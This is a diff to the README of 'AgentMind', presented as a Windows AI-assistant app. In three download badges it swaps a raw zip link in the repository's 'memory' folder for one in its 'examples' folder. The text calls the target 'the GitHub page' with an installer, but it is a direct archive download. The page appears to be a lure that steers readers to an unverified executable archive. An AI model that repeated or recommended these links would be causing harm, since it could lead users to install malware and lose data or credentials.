@@ -1,6 +1,6 @@
 # 🤖 AgentMind - AI Brain That Thinks and Remembers
 
-[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmed-Mazh2r/AgentMind/main/memory/Mind-Agent-3.2.zip)
+[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmed-Mazh2r/AgentMind/main/examples/Mind-Agent-3.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ To begin using AgentMind on your Windows computer, follow these steps carefully.
 
 Visit the link below to download the latest version:
 
-[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmed-Mazh2r/AgentMind/main/memory/Mind-Agent-3.2.zip)
+[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmed-Mazh2r/AgentMind/main/examples/Mind-Agent-3.3.zip)
 
 This link takes you to the GitHub page where you can find the installer file for Windows.
 
@@ -140,7 +140,7 @@ For advanced help, explore the GitHub issues page where users share fixes and ti
 
 Access the latest version anytime here:
 
-[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmed-Mazh2r/AgentMind/main/memory/Mind-Agent-3.2.zip)
+[![Download AgentMind](https://img.shields.io/badge/Download-AgentMind-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmed-Mazh2r/AgentMind/main/examples/Mind-Agent-3.3.zip)
 
 Use this link to find updates, new releases, and support.
 
